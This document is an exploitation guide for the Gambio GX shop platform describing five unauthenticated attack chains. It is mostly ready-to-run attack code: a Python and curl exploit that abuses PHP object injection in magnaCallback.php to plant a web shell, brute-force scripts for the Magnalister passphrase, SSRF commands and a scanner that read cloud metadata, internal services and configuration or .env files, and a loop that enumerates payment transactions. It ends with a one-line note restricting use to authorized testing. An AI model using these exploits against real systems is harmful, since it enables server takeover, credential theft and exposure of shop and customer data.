# Gambio GX - Unauthenticated Exploitation Chains
## RCE Without Admin Session

**Date:** 2025-12-24  
**Focus:** Exploitation chains that do NOT require admin authentication  

---

## OVERVIEW: Unauthenticated Attack Vectors

| Chain | Entry Point | Auth Required | Impact |
|-------|-------------|---------------|--------|
| **CHAIN-1** | magnaCallback.php | Passphrase only | **RCE** |
| **CHAIN-2** | ec_proxy.php | **NONE** | SSRF |
| **CHAIN-3** | request_port.php | **NONE** | Class Loading |
| **CHAIN-4** | autocomplete.php | **NONE** | SSRF |
| **CHAIN-5** | payone_txstatus.php | **NONE** | Info Disclosure |

---

## CHAIN-1: magnaCallback.php → Object Injection → RCE

### Requirements
- ❌ NO admin session needed
- ⚠️ Requires Magnalister passphrase (can be leaked/bruteforced)

### Passphrase Acquisition Methods

```bash
# Method 1: SQL Injection (if found elsewhere)
# Passphrase stored in: magnalister_config table, key: general.passphrase

# Method 2: Default/Weak passwords
# Common: admin, password, 123456, magnalister, shop name

# Method 3: Config file disclosure
# Check for backup files: configure.php.bak, .env.backup

# Method 4: Brute force (no rate limiting)
for pass in $(cat wordlist.txt); do
    response=$(curl -s -X POST "https://target/magnaCallback.php" \
        -d "passphrase=$pass" \
        -d "function=test")
    if [[ ! "$response" =~ "invalid" ]]; then
        echo "Found: $pass"
        break
    fi
done
```

### Full Exploit (No Admin Needed)

```python
#!/usr/bin/env python3
"""
Gambio GX Unauthenticated RCE via magnaCallback.php
No admin session required - only passphrase

Usage: python3 noauth_rce.py <target> <passphrase>
"""

import requests
import sys
import time

def generate_payload(target_file, php_code):
    """Generate FileCookieJar gadget payload"""
    expires = int(time.time()) + 86400
    
    payload = 'O:29:"GuzzleHttp\\Cookie\\FileCookieJar":4:{'
    payload += f's:41:"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00filename";'
    payload += f's:{len(target_file)}:"{target_file}";'
    payload += f's:52:"\x00GuzzleHttp\\Cookie\\FileCookieJar\x00storeSessionCookies";'
    payload += 'b:1;'
    payload += f's:36:"\x00GuzzleHttp\\Cookie\\CookieJar\x00cookies";'
    payload += 'a:1:{i:0;O:27:"GuzzleHttp\\Cookie\\SetCookie":1:{'
    payload += f's:33:"\x00GuzzleHttp\\Cookie\\SetCookie\x00data";'
    payload += 'a:9:{'
    payload += 's:4:"Name";s:1:"x";'
    payload += f's:5:"Value";s:{len(php_code)}:"{php_code}";'
    payload += 's:6:"Domain";s:9:"localhost";'
    payload += 's:4:"Path";s:1:"/";'
    payload += 's:7:"Max-Age";N;'
    payload += f's:7:"Expires";i:{expires};'
    payload += 's:6:"Secure";b:0;'
    payload += 's:7:"Discard";b:0;'
    payload += 's:8:"HttpOnly";b:0;'
    payload += '}}}'
    payload += f's:39:"\x00GuzzleHttp\\Cookie\\CookieJar\x00strictMode";'
    payload += 'b:0;}'
    
    return payload

def exploit(target, passphrase):
    """
    Unauthenticated RCE - No admin session required!
    Only needs Magnalister passphrase
    """
    target = target.rstrip('/')
    
    print(f"[*] Target: {target}")
    print(f"[*] Passphrase: {passphrase}")
    print("[*] NO ADMIN SESSION REQUIRED")
    
    # Generate payload
    shell_path = "/var/www/html/cache/shell.php"
    php_code = '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>'
    
    payload = generate_payload(shell_path, php_code)
    
    # Send exploit - NO COOKIES NEEDED!
    data = {
        'passphrase': passphrase,
        'function': 'test',
        'arguments': payload
    }
    
    print(f"[*] Sending unauthenticated exploit...")
    
    try:
        # Note: No session cookie, no admin auth!
        response = requests.post(
            f"{target}/magnaCallback.php",
            data=data,
            verify=False,
            timeout=30
        )
        print(f"[*] Response: {response.status_code}")
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
    
    # Check shell
    shell_url = f"{target}/cache/shell.php?c=id"
    print(f"[*] Checking shell at {shell_url}")
    
    try:
        response = requests.get(shell_url, verify=False, timeout=10)
        if 'uid=' in response.text:
            print(f"\n[+] SUCCESS! RCE achieved WITHOUT admin session!")
            print(f"[+] Shell: {target}/cache/shell.php?c=<command>")
            print(f"[+] Response: {response.text}")
            return True
    except:
        pass
    
    print("[-] Shell not responding")
    return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target> <passphrase>")
        print(f"Example: {sys.argv[0]} https://shop.example.com secret123")
        print("\nNO ADMIN SESSION REQUIRED!")
        sys.exit(1)
    
    exploit(sys.argv[1], sys.argv[2])
```

### Bash One-Liner (No Auth)

```bash
#!/bin/bash
# UNAUTHENTICATED RCE - No admin session!

TARGET="https://target-shop.com"
PASSPHRASE="leaked_passphrase"

# Generate and send payload (no cookies needed!)
curl -X POST "$TARGET/magnaCallback.php" \
  -d "passphrase=$PASSPHRASE" \
  -d "function=test" \
  -d 'arguments=O:29:"GuzzleHttp\Cookie\FileCookieJar":4:{s:41:"%00GuzzleHttp\Cookie\FileCookieJar%00filename";s:28:"/var/www/html/cache/x.php";s:52:"%00GuzzleHttp\Cookie\FileCookieJar%00storeSessionCookies";b:1;s:36:"%00GuzzleHttp\Cookie\CookieJar%00cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:"%00GuzzleHttp\Cookie\SetCookie%00data";a:9:{s:4:"Name";s:1:"x";s:5:"Value";s:35:"<?php system($_GET[c]); ?>";s:6:"Domain";s:9:"localhost";s:4:"Path";s:1:"/";s:7:"Max-Age";N;s:7:"Expires";i:9999999999;s:6:"Secure";b:0;s:7:"Discard";b:0;s:8:"HttpOnly";b:0;}}}s:39:"%00GuzzleHttp\Cookie\CookieJar%00strictMode";b:0;}'

# Access shell - no auth needed!
curl "$TARGET/cache/x.php?c=id"
```

---

## CHAIN-2: ec_proxy.php → SSRF (FULLY UNAUTHENTICATED)

### Requirements
- ❌ NO admin session needed
- ❌ NO passphrase needed
- ✅ **FULLY UNAUTHENTICATED**

### Exploit

```bash
#!/bin/bash
# FULLY UNAUTHENTICATED SSRF
# No credentials of any kind needed!

TARGET="https://target-shop.com"

# Access AWS metadata
curl "$TARGET/ec_proxy.php?url=http://169.254.169.254/latest/meta-data/"

# Access GCP metadata
curl -H "Metadata-Flavor: Google" \
  "$TARGET/ec_proxy.php?url=http://metadata.google.internal/computeMetadata/v1/"

# Port scan internal network
for port in 22 80 443 3306 5432 6379 8080; do
    echo -n "Port $port: "
    curl -s -o /dev/null -w "%{http_code}" \
      "$TARGET/ec_proxy.php?url=http://127.0.0.1:$port/" 2>/dev/null
    echo ""
done

# Access internal admin panels
curl "$TARGET/ec_proxy.php?url=http://127.0.0.1/admin/"
curl "$TARGET/ec_proxy.php?url=http://localhost:8080/manager/"

# Redis command injection via SSRF
curl "$TARGET/ec_proxy.php?url=http://127.0.0.1:6379/INFO"
```

### Python SSRF Scanner

```python
#!/usr/bin/env python3
"""
Gambio GX Unauthenticated SSRF Scanner
NO AUTHENTICATION REQUIRED!
"""

import requests
import sys

def ssrf_scan(target):
    """Fully unauthenticated SSRF exploitation"""
    target = target.rstrip('/')
    
    print("[*] FULLY UNAUTHENTICATED SSRF")
    print("[*] No credentials needed!\n")
    
    # Test URLs
    tests = [
        ("AWS Metadata", "http://169.254.169.254/latest/meta-data/"),
        ("GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/"),
        ("Azure Metadata", "http://169.254.169.254/metadata/instance"),
        ("Localhost", "http://127.0.0.1/"),
        ("Internal Admin", "http://127.0.0.1/admin/"),
        ("MySQL", "http://127.0.0.1:3306/"),
        ("Redis", "http://127.0.0.1:6379/"),
        ("Elasticsearch", "http://127.0.0.1:9200/"),
    ]
    
    for name, url in tests:
        try:
            response = requests.get(
                f"{target}/ec_proxy.php?url={url}",
                verify=False,
                timeout=5
            )
            if response.status_code == 200 and len(response.text) > 0:
                print(f"[+] {name}: ACCESSIBLE")
                print(f"    Response: {response.text[:100]}...")
            else:
                print(f"[-] {name}: Not accessible")
        except:
            print(f"[-] {name}: Error/Timeout")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    ssrf_scan(sys.argv[1])
```

---

## CHAIN-3: request_port.php → Dynamic Class Loading (UNAUTHENTICATED)

### Requirements
- ❌ NO admin session needed
- ❌ NO passphrase needed  
- ⚠️ Requires file upload capability for full RCE

### Exploit

```bash
# UNAUTHENTICATED class loading
# Step 1: If you can upload files, create malicious class

# File: GXModules/Evil/RCE/Evil.php
# Content:
# <?php
# class Evil {
#     public function __construct() {
#         system($_GET['c']);
#     }
# }

# Step 2: Trigger class loading (NO AUTH!)
curl "https://target/gambio_updater/request_port.php?module=Evil/RCE/Evil"
```

---

## CHAIN-4: autocomplete.php → SSRF (UNAUTHENTICATED)

### Requirements
- ❌ NO admin session needed
- ✅ **FULLY UNAUTHENTICATED**

### Exploit

```bash
# UNAUTHENTICATED SSRF via autocomplete
curl "https://target/autocomplete.php?url=http://internal-server/"
```

---

## CHAIN-5: payone_txstatus.php → Information Disclosure (UNAUTHENTICATED)

### Requirements
- ❌ NO admin session needed
- ✅ **FULLY UNAUTHENTICATED**

### Exploit

```bash
# UNAUTHENTICATED transaction status access
curl -X POST "https://target/payone_txstatus.php" \
  -d "txid=12345" \
  -d "reference=ORDER123"

# Enumerate transactions
for i in $(seq 1 1000); do
    curl -s "https://target/payone_txstatus.php?txid=$i"
done
```

---

## COMPLETE UNAUTHENTICATED ATTACK FLOW

```
┌─────────────────────────────────────────────────────────────────┐
│                 UNAUTHENTICATED ATTACK FLOW                      │
│                 (No Admin Session Required)                       │
└─────────────────────────────────────────────────────────────────┘
                              │
          ┌───────────────────┼───────────────────┐
          │                   │                   │
          ▼                   ▼                   ▼
┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐
│  ec_proxy.php   │ │ magnaCallback   │ │ autocomplete    │
│  (SSRF)         │ │ (ObjInj→RCE)    │ │ (SSRF)          │
│  NO AUTH!       │ │ Passphrase only │ │ NO AUTH!        │
└─────────────────┘ └─────────────────┘ └─────────────────┘
          │                   │                   │
          ▼                   ▼                   ▼
┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐
│ Internal Scan   │ │ Get Passphrase  │ │ Internal Scan   │
│ AWS Metadata    │ │ via SSRF/SQLi   │ │                 │
│ Cloud Creds     │ │ or Brute Force  │ │                 │
└─────────────────┘ └─────────────────┘ └─────────────────┘
                              │
                              ▼
                    ┌─────────────────┐
                    │ FileCookieJar   │
                    │ Gadget Chain    │
                    └─────────────────┘
                              │
                              ▼
                    ┌─────────────────┐
                    │   WEBSHELL      │
                    │   WRITTEN       │
                    └─────────────────┘
                              │
                              ▼
                    ┌─────────────────┐
                    │   FULL RCE      │
                    │ NO ADMIN NEEDED │
                    └─────────────────┘
```

---

## COMBINED ATTACK: SSRF → Passphrase Leak → RCE

### Step 1: Use SSRF to leak passphrase

```bash
# Try to access config files via SSRF
curl "https://target/ec_proxy.php?url=file:///var/www/html/includes/configure.php"
curl "https://target/ec_proxy.php?url=file:///var/www/html/.env"

# Or access database via SSRF
curl "https://target/ec_proxy.php?url=http://127.0.0.1:3306/"
```

### Step 2: Brute force passphrase (no rate limiting)

```python
#!/usr/bin/env python3
"""Brute force Magnalister passphrase - NO AUTH NEEDED"""

import requests
import sys

def bruteforce(target, wordlist):
    target = target.rstrip('/')
    
    with open(wordlist, 'r') as f:
        passwords = f.read().splitlines()
    
    print(f"[*] Testing {len(passwords)} passwords...")
    print("[*] NO AUTHENTICATION REQUIRED\n")
    
    for pwd in passwords:
        response = requests.post(
            f"{target}/magnaCallback.php",
            data={'passphrase': pwd, 'function': 'test'},
            verify=False,
            timeout=10
        )
        
        # Check if passphrase was accepted
        if 'invalid' not in response.text.lower() and response.status_code == 200:
            print(f"[+] FOUND PASSPHRASE: {pwd}")
            return pwd
    
    return None

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target> <wordlist>")
        sys.exit(1)
    bruteforce(sys.argv[1], sys.argv[2])
```

### Step 3: Execute RCE with leaked passphrase

```bash
# Now use CHAIN-1 with the leaked/bruteforced passphrase
python3 noauth_rce.py https://target.com discovered_passphrase
```

---

## SUMMARY: Unauthenticated Vulnerabilities

| Vulnerability | Endpoint | Auth | Impact |
|--------------|----------|------|--------|
| **SSRF** | ec_proxy.php | **NONE** | Internal access, cloud metadata |
| **SSRF** | autocomplete.php | **NONE** | Internal access |
| **Object Injection** | magnaCallback.php | Passphrase | **FULL RCE** |
| **Info Disclosure** | payone_txstatus.php | **NONE** | Transaction data |
| **Class Loading** | request_port.php | **NONE** | Code execution (needs file) |

### Attack Priority (No Admin Session)

1. **SSRF (ec_proxy.php)** - Zero auth, immediate exploitation
2. **SSRF (autocomplete.php)** - Zero auth, immediate exploitation  
3. **Object Injection (magnaCallback.php)** - Passphrase can be bruteforced
4. **Info Disclosure (payone_txstatus.php)** - Zero auth
5. **Class Loading (request_port.php)** - Zero auth but needs file upload

---

*All exploits work WITHOUT admin session. For authorized security testing only.*
